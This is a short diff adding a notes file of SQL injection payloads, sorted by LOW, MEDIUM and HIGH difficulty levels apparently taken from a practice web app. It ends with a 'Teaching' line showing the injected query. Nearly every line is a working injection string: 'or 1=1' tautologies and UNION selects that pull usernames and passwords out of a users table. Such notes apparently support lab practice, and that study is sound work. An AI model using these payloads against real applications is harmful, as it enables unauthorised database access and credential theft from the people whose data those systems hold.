@@ -1,0 +1,17 @@
+LOW
+hari' or 1=1#
+hari' UNION select user,password from users#
+
+MEDIUM
+value="1 or 1=1"
+value="1 UNION select user,password from users"
+
+HIGH
+
+hari' or 1=1#
+hari' UNION select version(),password from users#
+
+Teaching :
+
+id = 1' or '1'='1'#
+SELECT first_name, last_name FROM users WHERE user_id = '1' or '1'='1'#';
